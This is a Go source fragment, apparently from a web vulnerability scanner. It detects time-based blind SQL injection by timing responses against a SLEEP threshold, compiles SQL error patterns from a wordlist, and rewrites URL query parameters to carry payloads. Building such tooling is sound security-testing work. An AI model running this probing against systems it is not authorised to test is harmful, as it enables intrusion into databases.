func timeBasedInjectable(ctx context.Context, client *http.Client, opts SQLiOptions, r sqliReq, baseLatency time.Duration) bool {
	threshold := baseLatency + time.Duration(float64(time.Duration(opts.SleepSeconds)*time.Second)*0.6)
	_, _, _, elapsed, err := sqliExec(ctx, client, opts, r)
	if err != nil || elapsed < threshold {
		return false
	}
	output.Debug("candidate SLEEP delay %s (threshold %s) at %s; confirming", elapsed.Round(time.Millisecond), threshold.Round(time.Millisecond), r.url)
	_, _, _, elapsed2, err := sqliExec(ctx, client, opts, r)
	return err == nil && elapsed2 >= threshold
}

// loadSQLErrorPatterns compiles each wordlist line as a case-insensitive regex.
func loadSQLErrorPatterns(path string) ([]*regexp.Regexp, error) {
	lines, err := LoadWordlist(path)
	if err != nil {
		return nil, err
	}
	patterns := make([]*regexp.Regexp, 0, len(lines))
	for _, line := range lines {
		re, err := regexp.Compile("(?i)" + line)
		if err != nil {
			return nil, fmt.Errorf("invalid error pattern %q: %w", line, err)
		}
		patterns = append(patterns, re)
	}
	return patterns, nil
}

func queryParamNames(target string) []string {
	u, err := url.Parse(target)
	if err != nil {
		return nil
	}
	values, err := url.ParseQuery(u.RawQuery)
	if err != nil {
		return nil
	}
	var names []string
	for name := range values {
		names = append(names, name)
	}
	return names
}

// paramValue returns the current value of a query parameter, or "" if absent.
func paramValue(target, name string) string {
	u, err := url.Parse(target)
	if err != nil {
		return ""
	}
	values, err := url.ParseQuery(u.RawQuery)
	if err != nil {
		return ""
	}
	return values.Get(name)
}

// replaceQueryParam rewrites a single query parameter's value, leaving the rest
// of the URL intact.
func replaceQueryParam(target, name, payload string) string {
	u, err := url.Parse(target)
	if err != nil {
		return target
	}
	values, err := url.ParseQuery(u.RawQuery)
	if err != nil {
		return target
	}
	values.Set(name, payload)
	u.RawQuery = values.Encode()
	return u.String()
}
